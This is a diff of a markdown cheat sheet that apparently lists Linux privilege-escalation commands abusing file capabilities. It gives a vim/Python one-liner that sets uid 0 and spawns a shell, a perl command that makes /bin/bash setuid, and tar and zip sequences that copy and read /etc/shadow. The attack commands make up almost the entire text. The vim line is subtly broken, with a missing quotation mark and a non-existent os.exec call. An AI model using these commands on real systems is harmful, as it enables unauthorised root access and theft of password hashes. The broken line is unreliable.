@@ -10,12 +10,27 @@
 
 ## Example:
 
-### 
+### 1) cap_setuid+ep
 
-    ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")' (cap_setuid+ep)
+    ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")' 
 
-### 
+### 2) cap_fowner+ep
 
-    ./perl -e 'chmod 04777, "/bin/bash";' (cap_fowner+ep)
+    ./perl -e 'chmod 04777, "/bin/bash";' 
 
+### 3) cap_dac_read_search=ep
 
+Tar
+
+    tar -cvf shadow.tar /etc/shadow
+    tar -xvf shadow.tar
+    cat /etc/shadow
+    
+Zip
+
+    /path/to/zip /tmp/shadow.zip /etc/shadow
+    #/path/to/ is the directory of the zip file with the added capability.
+    #Next, we extract that archive: 
+    unzip /tmp/shadow.zip -d /tmp
+    #Then, we can simply read the file: 
+    cat /tmp/etc/shadow
